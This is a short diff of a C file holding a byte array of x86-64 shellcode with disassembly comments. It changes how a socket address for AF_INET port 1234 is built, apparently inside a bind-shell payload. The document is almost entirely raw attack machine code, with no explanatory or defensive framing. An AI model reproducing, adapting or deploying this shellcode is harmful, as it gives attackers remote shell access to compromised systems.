@@ -115,9 +115,9 @@ char BS[] = {
   /* 000A */ "\x99"                                     /* cdq                         */
   /* 000B */ "\x0f\x05"                                 /* syscall                     */
   /* 000D */ "\x97"                                     /* xchg edi, eax               */
-  /* 000E */ "\xb8\x02\xff\x04\xd2"                     /* mov eax, 0xd204ff02         */
-  /* 0013 */ "\xfe\xc4"                                 /* inc ah                      */
-  /* 0015 */ "\x50"                                     /* push rax                    */
+  /* 000E */ "\xbb\x02\xff\x04\xd2"                     /* mov ebx, 0xd204ff02         */
+  /* 0013 */ "\xfe\xc7"                                 /* inc bh                      */
+  /* 0015 */ "\x53"                                     /* push rbx                    */
   /* 0016 */ "\x54"                                     /* push rsp                    */
   /* 0017 */ "\x5e"                                     /* pop rsi                     */
   /* 0018 */ "\xb2\x10"                                 /* mov dl, 0x10                */
